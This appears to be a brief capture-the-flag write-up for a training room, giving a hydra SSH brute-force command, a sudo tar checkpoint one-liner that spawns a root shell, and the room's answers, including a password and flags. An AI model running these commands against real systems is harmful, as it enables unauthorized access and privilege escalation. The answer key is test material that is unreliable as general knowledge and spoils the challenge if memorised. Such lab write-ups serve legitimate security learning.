# Bounty Hacker-SSH bruteforce&Sudo tar privilege escalation

```
export IP=10.10.243.10
```

# Material needed

1. Find password SSH for lin with hydra

```
hydra -l lin -P locks.txt -t 4 ssh
```

2. Privilege escalation

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

# Tasks

1. Who wrote the task list? lin

2. What service can you bruteforce with the text file found? ssh

3. What is the users password? RedDr4gonSynd1cat3

4. user.txt

```
THM{CR1M3_SyNd1C4T3}
``` 

5. root.txt

```
THM{80UN7Y_h4cK3r}
```